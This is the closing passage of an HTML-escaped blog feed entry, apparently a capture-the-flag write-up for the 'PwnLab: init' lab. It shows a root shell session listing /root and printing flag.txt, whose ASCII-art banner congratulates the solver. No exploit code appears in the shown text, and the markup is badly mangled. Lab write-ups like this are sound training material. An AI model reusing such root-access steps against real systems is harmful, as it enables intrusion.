</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;cd /root&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;cd /root&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;ls -al&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;ls -al
</span><span class='line'>total 20
</span><span class='line'>drwx<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>  <span class="m">2</span> root root <span class="m">4096</span> Mar <span class="m">17</span> 15:17 .
</span><span class='line'>drwxr-xr-x <span class="m">21</span> root root <span class="m">4096</span> Mar <span class="m">17</span> 09:13 ..
</span><span class='line'>lrwxrwxrwx  <span class="m">1</span> root root    <span class="m">9</span> Mar <span class="m">17</span> 10:06 .bash_history -&gt; /dev/null
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>  <span class="m">1</span> root root  <span class="m">570</span> Jan <span class="m">31</span>  <span class="m">2010</span> .bashrc
</span><span class='line'><span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-  <span class="m">1</span> root root <span class="m">1840</span> Mar <span class="m">17</span> 15:17 flag.txt
</span><span class='line'>lrwxrwxrwx  <span class="m">1</span> root root    <span class="m">9</span> Mar <span class="m">17</span> 13:10 messages.txt -&gt; /dev/null
</span><span class='line'>lrwxrwxrwx  <span class="m">1</span> root root    <span class="m">9</span> Mar <span class="m">17</span> 13:10 .mysql_history -&gt; /dev/null
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>  <span class="m">1</span> root root  <span class="m">140</span> Nov <span class="m">19</span>  <span class="m">2007</span> .profile&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;cat flag.txt&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;cat flag.txt
</span><span class='line'>.-<span class="o">=</span>~<span class="o">=</span>-.                                                                 .-<span class="o">=</span>~<span class="o">=</span>-.
</span><span class='line'><span class="o">(</span>&lt;strong&gt;  &lt;em&gt;<span class="o">)</span>-.&lt;/em&gt;.-<span class="o">=</span>-.&lt;em&gt;.-<span class="o">=</span>-.&lt;/em&gt;.-<span class="o">=</span>-.&lt;em&gt;.-<span class="o">=</span>-.&lt;/em&gt;.-<span class="o">=</span>-.&lt;em&gt;.-<span class="o">=</span>-.&lt;/em&gt;.-<span class="o">=</span>-.&lt;em&gt;.-<span class="o">=</span>-.&lt;/em&gt;.-<span class="o">=</span>-.&lt;em&gt;.-<span class="o">=</span>-.&lt;/em&gt;.-<span class="o">(</span>&lt;/strong&gt;  &lt;em&gt;<span class="o">)</span>
</span><span class='line'><span class="o">(</span>&lt;/em&gt; &lt;strong&gt;&lt;em&gt;<span class="o">)</span>  &lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;                             _                            <span class="o">(</span>&lt;em&gt; &lt;/em&gt;&lt;/strong&gt;<span class="o">)</span>
</span><span class='line'><span class="o">(</span>&lt;strong&gt;  _<span class="o">)</span> /  &lt;/strong&gt; <span class="se">\ </span>                          <span class="p">|</span> <span class="p">|</span>                           <span class="o">(</span>&lt;strong&gt;  _<span class="o">)</span>
</span><span class='line'><span class="o">(</span> _ &lt;/strong&gt;<span class="o">)</span> <span class="p">|</span> /  <span class="se">\/</span> &lt;em&gt;&lt;strong&gt;  _ &lt;/strong&gt;   &lt;strong&gt; _ _ &lt;/strong&gt; __ &lt;/em&gt;<span class="p">|</span> <span class="p">|</span>&lt;em&gt; &lt;/em&gt;&lt;strong&gt;                      <span class="o">(</span> _ &lt;/strong&gt;<span class="o">)</span>
</span><span class='line'><span class="o">(</span>&lt;strong&gt;  &lt;em&gt;<span class="o">)</span> <span class="p">|</span> <span class="p">|</span>    / _ <span class="p">|</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>&lt;/em&gt; <span class="se">\ </span>/ _&lt;code&gt;<span class="p">|</span> <span class="s1">&#39;__/ _&lt;/code&gt; | &lt;/strong&gt;/ &lt;strong&gt;|                     (&lt;/strong&gt;  &lt;em&gt;)</span>
</span><span class='line'><span class="s1">(&lt;/em&gt; &lt;strong&gt;&lt;em&gt;) | _&lt;/em&gt;/\ (&lt;em&gt;) | | | | (&lt;/em&gt;| | | | (&lt;em&gt;| | |&lt;/em&gt;_&lt;em&gt; \                     (&lt;/em&gt; &lt;/strong&gt;&lt;em&gt;)</span>
</span><span class='line'><span class="s1">(__  &lt;/em&gt;)  _&lt;em&gt;&lt;strong&gt;/_&lt;/strong&gt;/|&lt;/em&gt;| |&lt;em&gt;|_&lt;/em&gt;, |&lt;em&gt;|  _&lt;/em&gt;,&lt;em&gt;|_&lt;/em&gt;|&lt;em&gt;&lt;strong&gt;/                     (&lt;/strong&gt;  &lt;/em&gt;)</span>
</span><span class='line'><span class="s1">( _ &lt;strong&gt;)                     &lt;/strong&gt;/ |                                       ( _ &lt;strong&gt;)</span>
</span><span class='line'><span class="s1">(&lt;/strong&gt;  &lt;em&gt;)                    |&lt;/em&gt;&lt;strong&gt;/                                        (&lt;/strong&gt;  &lt;em&gt;)</span>
</span><span class='line'><span class="s1">(__  &lt;/em&gt;)                                                                 (&lt;strong&gt;  &lt;em&gt;)</span>
</span><span class='line'><span class="s1">(&lt;/em&gt; &lt;/strong&gt;&lt;em&gt;) If  you are  reading this,  means  that you have  break &#39;</span>init<span class="p">&amp;</span>rsquo<span class="p">;</span>  <span class="o">(</span>&lt;/em&gt; &lt;em&gt;&lt;strong&gt;<span class="o">)</span>
</span><span class='line'><span class="o">(</span> _ &lt;/strong&gt;<span class="o">)</span> Pwnlab.  I hope  you enjoyed  and thanks  <span class="k">for</span>  your <span class="nb">time </span>doing  <span class="o">(</span> _ &lt;strong&gt;<span class="o">)</span>
</span><span class='line'><span class="o">(</span>&lt;/strong&gt;  &lt;/em&gt;<span class="o">)</span> this challenge.                                                 <span class="o">(</span>&lt;strong&gt;  &lt;em&gt;<span class="o">)</span>
</span><span class='line'><span class="o">(</span>&lt;/em&gt; &lt;/strong&gt;&lt;em&gt;<span class="o">)</span>                                                                 <span class="o">(</span>&lt;/em&gt; &lt;em&gt;&lt;strong&gt;<span class="o">)</span>
</span><span class='line'><span class="o">(</span> _ &lt;/strong&gt;<span class="o">)</span> Please send me  your  feedback or your  writeup,  I will  love  <span class="o">(</span> _ &lt;strong&gt;<span class="o">)</span>
</span><span class='line'><span class="o">(</span>&lt;/strong&gt;  &lt;/em&gt;<span class="o">)</span> reading it                                                      <span class="o">(</span>&lt;strong&gt;  _<span class="o">)</span>
</span><span class='line'><span class="o">(</span>&lt;/strong&gt;  &lt;em&gt;<span class="o">)</span>                                                                 <span class="o">(</span>__  &lt;/em&gt;<span class="o">)</span>
</span><span class='line'><span class="o">(</span>&lt;strong&gt;  _<span class="o">)</span>                                             For sniferl4bs.com  <span class="o">(</span>&lt;/strong&gt;  &lt;em&gt;<span class="o">)</span>
</span><span class='line'><span class="o">(</span> _ &lt;strong&gt;<span class="o">)</span>                                &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#x61;&amp;#x69;&amp;#x6c;&amp;#116;&amp;#111;&amp;#58;&amp;#x63;&amp;#108;&amp;#x61;&amp;#111;&amp;#x72;&amp;#64;&amp;#x50;&amp;#x77;&amp;#x6e;&amp;#x4c;&amp;#x61;&amp;#98;&amp;#x2e;&amp;#110;&amp;#x65;&amp;#x74;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#99;&amp;#x6c;&amp;#x61;&amp;#x6f;&amp;#114;&amp;#x40;&amp;#x50;&amp;#119;&amp;#x6e;&amp;#76;&amp;#97;&amp;#x62;&amp;#46;&amp;#110;&amp;#x65;&amp;#x74;&lt;/a&gt; - @Chronicoder  ( _ &lt;/strong&gt;)</span>
</span><span class='line'><span class="o">(</span>__  &lt;/em&gt;<span class="o">)</span>                                                                 <span class="o">(</span>&lt;strong&gt;  &lt;em&gt;<span class="o">)</span>
</span><span class='line'><span class="o">(</span>&lt;/em&gt; &lt;/strong&gt;&lt;em&gt;<span class="o">)</span>-.&lt;/em&gt;.-<span class="o">=</span>-.&lt;em&gt;.-<span class="o">=</span>-.&lt;/em&gt;.-<span class="o">=</span>-.&lt;em&gt;.-<span class="o">=</span>-.&lt;/em&gt;.-<span class="o">=</span>-.&lt;em&gt;.-<span class="o">=</span>-.&lt;/em&gt;.-<span class="o">=</span>-.&lt;em&gt;.-<span class="o">=</span>-.&lt;/em&gt;.-<span class="o">=</span>-.&lt;em&gt;.-<span class="o">=</span>-.&lt;/em&gt;.-<span class="o">(</span>&lt;em&gt; &lt;/em&gt;&lt;em&gt;_<span class="o">)</span>
</span><span class='line'>&lt;code&gt;-._.-<span class="s1">&#39;                                                                &lt;/code&gt;-.&lt;/em&gt;.-&#39;</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;
</span></code></pre></td></tr></table></div></figure></p>

<!--- Reference -->



]]></content>
  </entry>
  
</feed>
